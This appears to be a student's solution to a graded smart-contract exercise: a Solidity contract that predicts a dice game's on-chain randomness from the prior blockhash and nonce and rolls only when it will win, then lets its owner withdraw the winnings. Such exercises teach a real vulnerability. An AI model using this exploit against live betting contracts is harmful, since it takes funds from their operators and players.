pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negatively impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    constructor(address payable diceGameAddress) Ownable(msg.sender) {
        diceGame = DiceGame(diceGameAddress);
    }


    // Implement the `withdraw` function to transfer Ether from the rigged contract to a specified address.

    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        require(address(this).balance >= _amount, "Insufficient balance in contract");
        
        (bool success, ) = _addr.call{value: _amount}("");
        require(success, "Failed to send Ether");
    }

    // Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.

    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Must send Ether to roll");
        uint256 predictedRoll = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), address(diceGame), diceGame.nonce()))) % 16;

        console.log("Predicted Roll:", predictedRoll);

        require(predictedRoll < 6, "Predicted roll is not a winning roll");
        
        diceGame.rollTheDice{value: address(this).balance}();
    }

    // Include the `receive()` function to enable the contract to receive incoming Ether.

    receive() external payable {}
}
